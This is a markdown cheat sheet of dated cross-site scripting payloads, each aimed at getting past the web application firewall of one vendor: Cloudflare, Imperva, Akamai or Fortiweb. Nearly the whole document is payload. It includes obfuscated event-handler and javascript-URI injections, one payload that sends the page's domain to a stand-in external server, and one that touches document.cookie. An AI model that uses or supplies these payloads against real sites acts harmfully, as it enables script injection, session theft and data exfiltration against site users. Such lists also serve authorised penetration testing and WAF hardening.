# WAF Bypasses

The payloads are headed by the date of discovery of the bypass.

### Cloudflare

```csharp
//06-10-2021:
";(a=alert,b=1,a(b))

//17-08-2021:
"<iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >"

//04-08-2021:
%27%09);%0d%0a%09%09[1].find(alert)//

//22-05-2021:
"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

//12-04-2021:
<svg/onload=location/**/='https://your.server/'+document.domain>

//25-02-2021:
<svg onx=() onload=(confirm)(1)>

//25-01-2021:
<svg/onrandom=random onload=confirm(1)>

//11-01-2021:
<svg onload=alert%26%230000000040"1")>

//23-12-2020:
<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
```

### Imperva

```javascript
//24-02-2021:
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
```

### Akamai

```javascript
//28-09-2021:
"><a/\test="%26quot;x%26quot;"href='%01javascript:/*%b1*/;location.assign("//hackerone.com/stealthy?x="+location)'>Click

//13-12-2020:
<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>

//28-10-2018:
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```

### Fortiweb

```javascript
//09-07-2019:
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```

